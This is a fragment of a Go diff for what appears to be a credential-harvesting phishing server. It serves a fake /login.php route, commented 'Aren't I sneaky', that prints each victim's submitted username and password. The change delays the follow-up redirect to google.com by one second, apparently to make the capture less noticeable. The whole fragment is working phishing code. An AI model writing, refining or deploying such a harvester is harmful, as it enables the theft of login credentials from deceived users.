@@ -42,7 +42,7 @@ func login(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Printf("[+] username: %v password %v\n", username, password)
 
-	fmt.Fprint(w, "<script> window.location.replace(\"http://google.com\")</script>")
+	fmt.Fprint(w, "<script> setTimeout(function() { window.location.replace(\"http://google.com\"); }, 1000) </script>")
 }
 
 func main() {
@@ -50,5 +50,5 @@ func main() {
 
 	/* Aren't I sneaky */
 	http.HandleFunc("/login.php", login)
-	log.Fatal(http.ListenAndServe("0.0.0.0:80", nil))
+	log.Fatal(http.ListenAndServe(":80", nil))
 }
